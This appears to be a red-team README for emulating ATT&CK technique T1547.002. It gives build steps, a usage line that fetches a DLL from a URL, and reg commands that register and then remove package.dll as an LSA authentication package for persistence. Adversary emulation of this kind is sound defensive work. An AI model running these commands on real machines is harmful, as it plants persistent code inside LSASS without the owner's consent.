# T1547.002
## install.exe
### Compiling
    dotnet publish -c Release -r win-x64
### Using
    install.exe "<url_to_package.dll>"

## package.dll
Run `build.bat` in the developer prompt.

## Manual commands
Creating the key
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0"\0"package.dll" /f
```
Cleanup
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0" /f
```